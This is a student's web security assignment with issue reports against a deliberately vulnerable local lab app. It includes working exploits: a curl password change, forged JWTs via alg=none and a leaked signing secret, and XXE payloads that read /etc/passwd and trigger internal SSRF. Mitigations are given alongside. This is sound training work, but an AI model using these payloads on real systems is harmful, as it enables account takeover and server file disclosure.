# Assignment 2

Student ID: AC3837

Student name: Thanaphon Sombunkaeo

Group ID: TTV19S1

## First part A2:2017 Broken authentication

1. [Issue report] **TARGET => WasDat**: Testing unverified password change with curl (1 point)

   **Title:** Anonymous user can change password of other users.

   **Description:** There is a broken authentication on modifying user detail route which is PUT `/api/user`. Which means any user  can change password of others by invoke that API without permission.

   **Step to produce**: 

   - Run this command

     ```bash
     curl -i 'http://localhost:8080/api/user' -X PUT -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-CA,en-US;q=0.7,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json;charset=utf-8' -H 'Origin: http://localhost:8080' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'Authorization: Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDI4NjM5NTQsIm5iZiI6MTY0Mjg2Mzk1NCwianRpIjoiNDE1Mzc4ZmItNjUwYy00OTAwLTk3NWQtZjkzZjJjMjM5MGZmIiwiZXhwIjo4ODA0Mjg2Mzk1NCwiaWRlbnRpdHkiOjEsImZyZXNoIjp0cnVlLCJ0eXBlIjoiYWNjZXNzIn0.s27pIB_tDHJKbhFxMAa17Bj3-Urv7TM9UDfhHY-sopg' -H 'Referer: http://localhost:8080/' -H 'Connection: keep-alive' --data-raw '{"user":{"email":"wasdat-victim@example.com","username":"boyplus","bio":"test","image":null,"password":"66362b00beb0bd02d5288f8f14e2234bd00842b0"}}'
     ```

     After run curl command, we can change user password. The flag is shown below.

     <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-23 at 02.34.50.png" alt="Screen Shot 2565-01-23 at 02.34.50" style="zoom:50%;" />

   **Mitigation:**

   - First option: Force user to provide original password in the modify user detail especially to modify password. This method ensure that the user who change the password owns the account.
   - Second option: Use forgotten password that send some link for reseting password to email of user (link must b expired in the given time)

2. [Reading report] JWT Reading assignment (2 points)

   - Decode a wasdat-victim's JWT token and use it as an example

     The decode of the first two parts are shown below

   <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 23.14.38.png" alt="Screen Shot 2565-01-26 at 23.14.38" style="zoom:30%;" />

   - Identify structure of a JWT token and explain names and uses for its three parts

     The structure of JWT is a string that consists of three parts seperating by dots (.) which are header, payload, and signature.

     - Header: In general, it compose of two parts which are typ (type of the token), and alg (algorithm for signing such as HS256, RSA)
     - Payload: is the claims (usually is the detail of user additional detail)
     - Signature: use to verify that message is not change along the way. It can also verify the sender in case of tokens signed with private key. Signature is the encode of header, payload, and secret. We can specify the algorithm of encoding.

   - Pair iat, nbf, jti, exp values with RFC-7519 explanations

     - iat: 1643207292 It is time that JWT was issued
     - nbf: 1643207292 It is time that JWT will not be accepted before this time.
     - jti: c21ec4fb-4947-43a5-8c8c-4c8d37d0cd34 is the identification of JWT (unique)
     - exp: 88043207292 expiration time of JWT
     - What does WasDat's exp concrete actual value mean in terms of JWT token usage?
       - The exp value that I got is 88043207292. It is the time stamp that the JWT will be expired which means user cannot use this JWT for authentication anymore. After I convert the time stamp, the expiration date will be Thursday, December 24, 4759 2:28:12 PM

3. [Issue report] **TARGET => WasDat**: Exploiting alg=None in Wasdat (3,5 points)

   **Title:** Anonymous user can edit their JWT to login as another user.

   **Description:** The authentication method of wasdat allowed JWT with alg (algorithm = None) in header which means this token will be treated as a valid token with a verified signature. So, anyone can create their own sign token and edit their payload that they want. In this case, attacker can edit the decode JWT and edit the field `identity` to be the user ID of another user and use that JWT to login.

   **Step to produce**: 

   - Attacker login into system by using their own email and password.

   - Use the JWT from API POST `/api/user/` to decode in https://token.dev/ 

     - Here is decode of attacker's JWT

       ![Screen Shot 2565-01-26 at 00.47.25](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 00.47.25.png)

     - Here is decode of victim's JWT

       ![Screen Shot 2565-01-26 at 00.48.26](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 00.48.26.png)

   - Edit identity field in payload of attacker's JWt to be 1 (ID of wasdat-victim in this case)

   - Select the algorithm to be `none`

   - JWT consists two parts like this (without signature verified)

     ```
     eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE2NDMxNDQ0MzYsIm5iZiI6MTY0MzE0NDQzNiwianRpIjoiNzQ0MjQ0OWMtZWY3OC00MTRlLTlhNzAtMDk0ZWJjMjg0NGM0IiwiZXhwIjo4ODA0MzE0NDQzNiwiaWRlbnRpdHkiOjEsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9
     ```

   - Add the third part (verify signature) of original JWT to the end of edited JWT

     - ```
       eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpYXQiOjE2NDMxNDQ0MzYsIm5iZiI6MTY0MzE0NDQzNiwianRpIjoiNzQ0MjQ0OWMtZWY3OC00MTRlLTlhNzAtMDk0ZWJjMjg0NGM0IiwiZXhwIjo4ODA0MzE0NDQzNiwiaWRlbnRpdHkiOjEsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyJ9.oGhLGrCqRHFmVpFplxpVUiMTtmreL_rBq8RaHhgm0yU
       ```

   - Use this token (add Authorization in header) to change victim's password by calling API PUT `/api/user` (the token will be considered as a verified token of victim)

     ![Screen Shot 2565-01-26 at 01.54.00](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 01.54.00.png)

     From the above image, we can use that JWT to change the password of victim.

   **Impact estimation:** Hihg severity. Attacker can perform the above instrcutions to login as an any user that they have an ID. Especially in this system, ID are running number (1,2,3,...). So attacker can brute force to login to login all user, modify their detail, password, etc.

   **Mitigation:**

   - Disable alg = None in the login system. So the token with algorithms of None will not be verified. In general, many libraries already consider JWT with none algorithm as an invalid token. Reference https://medium.com/@palivela.chaitu/jwt-json-web-tokens-best-practices-with-node-js-e45d1bdfc12d in Common Attacks & Pitfalls section.

4. [Issue report] **TARGET => WasDat:** Exploiting leaked JWT secret (3,5 points)

   **Title:** Anonymous user can sign JWT to login as another user since they have secret key.

   **Description:** Since the JWT secret key is exposed, attacker can use that key to sign their JWT. Which means they can edit the payload to be another user, then encode that data to be JWT and use it to login as any user that they have user ID.

   **Step to produce:**

   - Use jwt library of python3 to decode the JWT
     - Decoded result of wasdat-victim's JWT

     ```json
     {'iat': 1642373494, 'nbf': 1642373494, 'jti': 'd7f03590-ab80-4038-b2c9-0d8295f9fee4', 'exp': 88042373494, 'identity': 1, 'fresh': True, 'type': 'access'}
     ```

     - Decoded result of attacker's JWT

     ```json
     {'iat': 1643144436, 'nbf': 1643144436, 'jti': '7442449c-ef78-414e-9a70-094ebc2844c4', 'exp': 88043144436, 'identity': 2, 'fresh': False, 'type': 'access'}
     ```

     `identity` field holds user id

   - Use jwt library in python to encode data that we edit identity field to be 1 (victim id) and add property 'was': true

     ```python
     import jwt
     key = "secret-key"
     payload_data = {
     	'iat': 1643144436,
     	'nbf': 1643144436,
     	'jti': '7442449c-ef78-414e-9a70-094ebc2844c4', 
     	'exp': 88043144436,
     	'identity': 1, 
     	'fresh': False, 
     	'type': 'access',
     	'was': True
     }
     
     token = jwt.encode(
         payload=payload_data,
         key=key,
         algorithm="HS256"
     )
     print(token)
     ```

     The token that I get is

     ```
     eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NDMxNDQ0MzYsIm5iZiI6MTY0MzE0NDQzNiwianRpIjoiNzQ0MjQ0OWMtZWY3OC00MTRlLTlhNzAtMDk0ZWJjMjg0NGM0IiwiZXhwIjo4ODA0MzE0NDQzNiwiaWRlbnRpdHkiOjEsImZyZXNoIjpmYWxzZSwidHlwZSI6ImFjY2VzcyIsIndhcyI6dHJ1ZX0.qVDNdcEK7dx6ceABSklcBCwirReGDlm4t95k5WmIIqU
     ```

     This token can be used to login as a wasdat-victim

   - Use the above JWT to authorize and edit wasdat-victim's password  by using postman

     ![Screen Shot 2565-01-26 at 03.52.43](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 03.52.43.png)

   **Impact estimation:** High severity because when attacker have secret key for signing JWT, they can create any JWT to login as any user. In worst case, they can edit the password of all user in the system.

   **Mitigation**

   - Ensure that JWT secret is not exposed because when it s exposed, attacker can use it to sign JWT. If you use store your code on open source e.g. GitHub and your repository is public, ensure that you use `.env` file to store JWT secret and ignore this file in `.gitignore`. So your JWT secret key will not expose in public. See answer 1 on https://stackoverflow.com/questions/70212485/secure-way-of-storing-jwt-secret-key-used-to-encode-decode-token-data

   

## Second part A4:2017 XML External Entities (XXE)

1. [Reading Report] "RWBH Chapter 11: XML External Entity (pp. 107-117) (2 pts)

   - Why is it possible to define your own doctype? 

     It is possible to define your own doctype because XML has no predefine tags like h1, and p in HTML. It allows user to define their own structure (which elements exist, attributes)

     - So what's the use case for defining doctypes
       - For example, when you want to define the structure of `Jobs` (collection of job), and Job that job have information about Title, Compensation, Responsibility.
     - Why does `SYSTEM` attribute exist within doctype definitions?
       - The two reasons are
         1. It is a keyword to tell the XML parser to get the content of specific file.
         2. It is keyword to tell the XML parser to make the HTTP request with GET method to specific endpoint.

2. [Issue report] **TARGET => WasDat:** Wasdat XXE Local File Read (4 pts)

   **Title:** Anonymous user can read any file in wasdat system by passing their xml file in custom search API

   **Description:** API POST `/api/articles/custom-search` allow user to send their payload which is xml file to search the article. When wasdat application parse the xml without it, attacker can read the file that they want.

   **Step to produce:**

   - Create `password-search.xml` file that contain following detail 

     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [
     	<!ELEMENT foo ANY >
     	<!ENTITY xxe SYSTEM "/etc/passwd" >
     ]
     >
     <foo>&xxe;</foo>
     ```

     This xml contains internal DTD defining a `foo` document type which can include any parsable data. Then we define entity xxe that will read file `/etc/passwd`. So, when the document is parsed, the parser will replace `&xxe` with the content in file.

   - Run the following curl command to call API

     ```bash
     curl -X POST http://localhost:8080/api/articles/custom-search -H "Content-Type: text/xml" --data "@password-search.xml"
     ```

     The result and **WasFlag5_1** (before last line) that I get is

     <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 16.31.22.png" alt="Screen Shot 2565-01-26 at 16.31.22" style="zoom:50%;" />

   

   **Impact estimation:** Attacker can read any file in the backend server by using !ENTITY with system attribute which is really bad if server contains sensitive data e.g. JWT secret key, user password.

   **Mitigation:**

   - Option one: Use XSD validation to validate the incoming XML file from user
   - Option two: Disable XML external entity and DTD processing in all XML parsers in the application.

3. [Issue report] **TARGET => WasDat:** Wasdat XXE SSRF (4 pts)

   **Title:** Annonymous user can call missile-control API by passing their xml file in custom search API.

   **Description:** API POST `/api/articles/custom-search` allow user to send their payload which is xml file to search the article. When wasdat application parse the xml without it. In this case, attacker can call missile-control API.

   **Step to produce:**

   - Create `missile-api.xml` file that contain following detail 

     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [
     	<!ELEMENT foo ANY >
     	<!ENTITY xxe SYSTEM "http://missile-control:6666/launch-the-missiles">
     ]
     >
     <foo>&xxe;</foo>
     ```

     This xml contains internal DTD defining a `foo` document type which can include any parsable data. Then we define entity xxe that will read file make an HTTP regquest GET method to  `http://missile-control:6666/launch-the-missiles`. So, when the document is parsed, the parser will replace `&xxe` with the result of API.

   - Run the following curl command to call API

     ```bash
     curl -X POST http://localhost:8080/api/articles/custom-search -H "Content-Type: text/xml" --data "@missile-api.xml"
     ```

     The result and **WasFlag5_2** that I get is

     ![Screen Shot 2565-01-26 at 20.09.31](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week2/Screen Shot 2565-01-26 at 20.09.31.png)

   **Impact estimation:** If API missile-control is a secret API that other user outside network should not have permission to call, it  is really bad as you can see the API anme as an exmaple that this API is an API to launch missile (High severity)

   **Mitigation:** same as above issue report

   - Option one: Use XSD validation to validate the incoming XML file from user
   - Option two: Disable XML external entity and DTD processing in all XML parsers.